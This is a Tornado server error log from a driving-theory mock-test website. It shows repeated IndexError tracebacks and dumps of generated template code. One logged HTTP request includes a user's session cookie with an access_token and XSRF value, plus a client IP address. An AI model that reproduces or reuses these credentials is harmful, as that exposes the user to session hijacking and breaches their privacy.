    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 97.96ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059e23f8e4c854802b2dbc0&answers=%5B3%5D&cursor=0&_xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c; __utmb=188782963.4.10.1348067779; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 68.49ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
